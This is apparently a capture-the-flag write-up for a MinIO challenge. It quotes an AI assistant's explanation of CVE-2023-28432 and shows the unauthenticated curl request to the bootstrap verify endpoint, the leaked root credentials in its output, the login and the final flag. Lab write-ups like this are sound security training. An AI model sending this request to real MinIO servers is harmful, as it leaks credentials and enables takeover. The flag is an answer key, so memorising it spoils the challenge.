 12 (100% liked)  0
En forældet MinIO-klynge kører med en kritisk sikkerhedssårbarhed.
Din opgave er at hente flaget. GLHF!

IT-Ops-portalen er tilgængelig på http://portal.cfire:8080.

NOTE: Create a user and find the VPN and Browser LABs on Campfire Labs:

https://kvalifikation.campfiresecurity.dk/challenges?challenge=bootstrap-betrayal

Bootstrap Betrayal
1000
An outdated MinIO cluster is running with a critical security vulnerability. Your goal is to retrieve the flag.

The IT-Ops Portal is accessible at http://portal.cfire:8080.

Flaget skal inløses på din respektive CTFd platform

T-Ops Channel
sarah.tech
2023-02-09
Hey team, just deployed the new MinIO cluster. Everything looks good so far.
mike.devops
2023-02-09
Nice! What version did we go with?
sarah.tech
2023-02-09
RELEASE.2022-10-24T18-35-07Z - it's the latest stable release.
alex.security
2023-02-15
Hey, has anyone upgraded MinIO? Security said something about an env var leak.
sarah.tech
2023-02-15
Hmm, I'll check on that. We just deployed it last week, so it should be fine.
mike.devops
2023-02-15
Yeah, let me know if you need help checking the version or anything.




env var leak.


http://minio.cfire:9001/login 

login page for Multicloud Object Store MINIO CONSOLE. 



https://en.wikipedia.org/wiki/MinIO


deprecated
https://github.com/minio/minio/blob/7aac2a2c5b7c882e68c1ce017d8256be2feea27f/README.md

What was the problem with the earlier version referred RELEASE.2022-10-24T18-35-07Z ? Will GitHub tell?

check releases

https://github.com/minio/minio/releases/tag/RELEASE.2025-10-15T17-29-55Z

going back

There IS a release on 24/10. https://github.com/minio/minio/releases/tag/RELEASE.2022-10-24T18-35-07Z !!

Let's look at the following release(s) for any hints.

29/10-2022: https://github.com/minio/minio/releases/tag/RELEASE.2022-10-29T06-21-33Z
(this is listed as a major feature release)

full log: https://github.com/minio/minio/compare/RELEASE.2022-10-24T18-35-07Z...RELEASE.2022-10-29T06-21-33Z


(maybe : https://github.com/minio/minio/security/advisories/GHSA-gr9v-6pcm-rqvg) Authenticated requests for server update admin API allows path traversal



Bug fix release 8/11-2022: https://github.com/minio/minio/releases/tag/RELEASE.2022-11-08T05-27-07Z


could it be 
https://github.com/minio/minio/pull/20756

fix: Privilege escalation in IAM import API



check version gives 500 (internal error) with text

{
    "code": 500,
    "detailedMessage": "Get \"https://dl.min.io/server/minio/release/linux-amd64/\": dial tcp 178.128.69.202:443: connect: connection refused",
    "message": "an error occurred, please try again"
}

dl-0.min.io
https://dl-0.min.io/server/minio/release/linux-amd64

virker faktisk ??

MinIO Version: RELEASE.2022-10-24T18-35-07Z
Last Updated: 2023-02-09

sker der noget 9/2 ??

check release yes. https://github.com/minio/minio/releases/tag/RELEASE.2023-02-09T05-16-53Z



Claude: 

This is CVE-2023-28432 — a well-known, trivially exploitable information disclosure vulnerability. Here's everything you need:
The Vulnerability
In MinIO cluster deployments between RELEASE.2019-12-17T23-16-33Z and before RELEASE.2023-03-20T20-16-18Z, MinIO returns all environment variables — including MINIO_SECRET_KEY and MINIO_ROOT_PASSWORD — to any unauthenticated requester, resulting in full credential disclosure. SentinelOne
Your target version RELEASE.2022-10-24T18-35-07Z falls squarely in the vulnerable range.
The Exploit
It's a single HTTP POST request — no authentication needed:


$ curl -X POST http://minio.cfire:9000/minio/bootstrap/v1/verify
{"MinioPlatform":"OS: linux | Arch: amd64","MinioEndpoints":[{"Legacy":true,"SetCount":1,"DrivesPerSet":4,"Endpoints":[{"Scheme":"http","Opaque":"","User":null,"Host":"minio.cfire:9000","Path":"/data","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":true},{"Scheme":"http","Opaque":"","User":null,"Host":"minio2.cfire:9000","Path":"/data","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio3.cfire:9000","Path":"/data","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false},{"Scheme":"http","Opaque":"","User":null,"Host":"minio4.cfire:9000","Path":"/data","RawPath":"","OmitHost":false,"ForceQuery":false,"RawQuery":"","Fragment":"","RawFragment":"","IsLocal":false}],"CmdLine":"http://minio.cfire/data http://minio2.cfire/data http://minio3.cfire/data http://minio4.cfire/data"}],"MinioEnv":{"MINIO_ACCESS_KEY_FILE":"access_key","MINIO_CONFIG_ENV_FILE":"config.env","MINIO_KMS_SECRET_KEY_FILE":"kms_master_key","MINIO_ROOT_PASSWORD":"X9mK2pL8vN4qR6wT3yU7zA1bC5dE","MINIO_ROOT_PASSWORD_FILE":"secret_key","MINIO_ROOT_USER":"admin_7h3_53cr37_k33p3r","MINIO_ROOT_USER_FILE":"access_key","MINIO_SECRET_KEY_FILE":"secret_key","MINIO_UPDATE_MINISIGN_PUBKEY":"RWTx5Zr1tiHQLwG9keckT0c45M3AGeHD6IvimQHpyRywVWGbP1aVSGav"}}



so, logged in with 

admin_7h3_53cr37_k33p3r
and password
X9mK2pL8vN4qR6wT3yU7zA1bC5dE


And we arrive at a bucket named after the CVE: pwned-minio-cve-2023-28432

we browse that

downloaded mc



jma@jens-pc:/mnt/c/workspace/ddc/2026/BOOTSTRAP_BETRAYAL/mc$ ./mc alias set pwned http://minio.cfire:9000
Enter Access Key: admin_7h3_53cr37_k33p3r
Enter Secret Key:
Added `pwned` successfully.
jma@jens-pc:/mnt/c/workspace/ddc/2026/BOOTSTRAP_BETRAYAL/mc$


DDC{pwn3d_m1n10_3nvs_v4r14bl3s}